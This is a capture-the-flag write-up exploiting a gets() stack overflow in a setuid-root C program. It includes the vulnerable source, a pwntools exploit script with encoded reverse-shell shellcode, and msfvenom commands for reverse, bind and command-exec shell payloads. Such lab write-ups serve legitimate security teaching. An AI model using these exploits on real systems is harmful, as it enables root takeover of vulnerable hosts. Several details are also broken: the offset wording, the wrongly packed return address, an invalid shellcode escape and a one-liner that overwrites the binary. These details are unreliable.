```c
#include <stdio.h>

int secret_function() {
    asm("jmp %esp");
}

void receive_feedback()
{
    char buffer[64];

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");
    gets(buffer);
}

int main()
{
    setuid(0);
    setgid(0);

    receive_feedback();

    return 0;
}
```

```txt
flag{w417_h0w_d1d_y0u_d0_7h47}
```

```bash
gcc prog.c -o prog -fno-stack-protector -z execstack -no-pie -m32
```

Ok so we have a `flag.txt` file which is only readable by the root user. We need to somehow trick the server, which is running as root, to reading the `flag.txt` file and give us the read content. There's no stack protection enabled according to `checksec`. `NX` was not enabled, therefore we can potentially inject our shellcode into this executable.

The server will use the setuid and setgid to make sure the file runs as root. The `receive_feedback` function just reads a 64-character string into the `buffer`. There's a `secret_function`, which performs a jump instruction to the address stored by register `esp`, which is the stack pointer. The `secret_function` doesn't really do anything interesting, it's just there for this challenge to make it so that we can easily create our ROP gadgets.

Our goal is to overwrite the return value with the `esp` value to jump to the stack, which will contain our shellcode, and the program will start executing our shellcode.

For this, the 77th-30th characters will land in the return address of `receive_feedback`, so there needs to be 76 padding bytes. After that, we want to write the `jmp esp` instruction onto the return address so that the program will jump to the top of the stack, which will contain our shellcode.

In this case, the address for `jmp esp` is `0x0804919f`. Now we need to generate our shellcode. We can use a tool like `shellcraft` or `msfvenom` to generate the shell. We'll generate a shellcode that will give us a 32-bit shell to use. This shell will be run with the permissions of the executable, which is root.

```bash
shellcraft i386.linux.sh
```

> We could also just generate shellcode that will cat the `flag.txt`.

Our payload will also contain some "slack" instructions (a bunch of `nop` instructions) before the shellcode.

```python
python -c 'import sys; sys.stdout.buffer.write(b"A" * 76 + b"\x9f\x91\x40\x80" + b"\x90\x90\x90\x90\x90\x90\x90\x90" + b"\xsh\xell\xco\xde"' > ./prog
```

> Doing this manually takes a lot of time. Use `pwntools` to automate the creation of the shellcode and exploitation.

Automation script with `shellcraft` and `pwntools`:

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './server'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Exploit start
io = start()

# Offset to EIP
padding = 76

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# Reverse shell
shellcode = b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
shellcode += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
shellcode += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
shellcode += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
shellcode += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
shellcode += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
shellcode += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
shellcode += b"\xa4\xec\x38\x51\x5f\xf1"

# Build payload
payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 8,
    shellcode
)

# Write payload to file
write("payload", payload)

# Exploit
io.sendlineafter(b':', payload)

# Get shell
io.interactive()
```

Side note: We can also specify the shellcode in the script like this (if we do decide to generate the shellcode with something that's not supported by `pwntools` like `msfvenom`)

```bash
# example msfvenom commands
msfvenom -p linux/x86/exec CMD="curl https://example.com" -b '\x00' -f python
msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python
```

```python
# example msfvenom shellcode in the python script
shellcode = b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
shellcode += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
shellcode += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
shellcode += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
shellcode += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
shellcode += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
shellcode += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
shellcode += b"\xa4\xec\x38\x51\x5f\xf1"
```